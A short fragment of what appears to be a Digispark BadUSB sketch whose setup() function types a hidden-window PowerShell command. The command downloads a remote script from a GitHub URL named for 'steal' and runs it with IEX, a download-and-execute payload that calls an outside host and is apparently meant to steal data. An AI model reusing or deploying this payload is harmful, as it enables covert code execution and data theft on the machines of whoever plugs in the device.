...
void setup() {
  ...
  DigiKeyboard.print("powershell.exe -windowstyle hidden -command \"$w=New-Object net.webclient; $c=$w.DownloadString('https://raw.githubusercontent.com/KysbKing/steal-digispark/steal-GrestalQ.ps1'); IEX $c;\"");
